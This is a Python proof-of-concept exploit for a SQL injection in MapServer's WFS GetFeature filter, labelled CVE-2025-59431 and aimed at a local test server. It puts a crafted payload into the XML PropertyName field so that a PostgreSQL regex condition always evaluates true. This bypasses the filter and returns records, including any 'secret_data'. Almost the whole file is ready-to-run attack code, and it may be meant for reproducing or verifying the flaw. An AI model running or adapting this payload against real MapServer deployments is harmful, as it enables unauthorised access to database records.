#!/usr/bin/env python3
import requests
import sys

TARGET_HOST = "http://localhost:8080"

def test_wfs():
    print("[*] Testing WFS service...")
    url = f"{TARGET_HOST}/?SERVICE=WFS&VERSION=1.0.0&REQUEST=GetCapabilities"
    try:
        resp = requests.get(url, timeout=10)
        if resp.status_code == 200 and "WFS_Capabilities" in resp.text:
            print("[+] WFS service is accessible")
            return True
    except Exception as e:
        print(f"[-] Error: {e}")
    return False

def wfs_query(property_name, literal):
    query = f'''<?xml version="1.0" ?>
<wfs:GetFeature service="WFS" version="1.0.0"
    xmlns:wfs="http://www.opengis.net/wfs"
    xmlns:ogc="http://www.opengis.net/ogc">
    <wfs:Query typeName="locations">
        <ogc:Filter>
            <ogc:PropertyIsLike wildCard="*" singleChar="." escapeChar="!">
                <ogc:PropertyName>{property_name}</ogc:PropertyName>
                <ogc:Literal>{literal}</ogc:Literal>
            </ogc:PropertyIsLike>
        </ogc:Filter>
    </wfs:Query>
</wfs:GetFeature>'''
    
    headers = {"Content-Type": "text/xml"}
    resp = requests.post(TARGET_HOST, data=query, headers=headers, timeout=10)
    return resp.text.count("featureMember"), resp.text

def exploit():
    print("\n" + "=" * 60)
    print("CVE-2025-59431 - MapServer WFS SQL Injection Exploit")
    print("=" * 60)
    
    print("\n[*] Step 1: Testing normal query...")
    normal_count, _ = wfs_query("name", "*Location A*")
    print(f"    Normal filter (name='Location A'): {normal_count} records")
    
    print("\n[*] Step 2: Testing query with no matches...")
    nomatch_count, _ = wfs_query("name", "*NOMATCH_TEST_12345*")
    print(f"    Filter with impossible match: {nomatch_count} records")
    
    print("\n[*] Step 3: Exploiting SQL injection via PropertyName...")
    payload = '"~\'.\'OR"'
    literal = "*NOMATCH_TEST_12345*"
    
    print(f"    Payload: PropertyName = {payload}")
    print(f"    Literal: {literal}")
    print(f"    Expected SQL: ('[' ~ '.' or TRUE or ']' ~ '^pattern$')")
    print(f"    The regex '[' ~ '.' evaluates to TRUE in PostgreSQL")
    
    exploit_count, response = wfs_query(payload, literal)
    print(f"\n    Result: {exploit_count} records returned")
    
    if exploit_count > nomatch_count:
        print("\n" + "=" * 60)
        print("[!] EXPLOITATION SUCCESSFUL!")
        print("=" * 60)
        print(f"[!] SQL injection bypassed the filter!")
        print(f"[!] Expected 0 records, got {exploit_count} records")
        
        if "secret_data" in response:
            print("[!] Sensitive data extracted!")
            
        return True
    else:
        print("\n[-] Exploitation failed")
        return False

def main():
    print("Target: " + TARGET_HOST)
    
    if not test_wfs():
        print("[-] WFS service not accessible")
        sys.exit(1)
    
    if exploit():
        sys.exit(0)
    else:
        sys.exit(1)

if __name__ == "__main__":
    main()
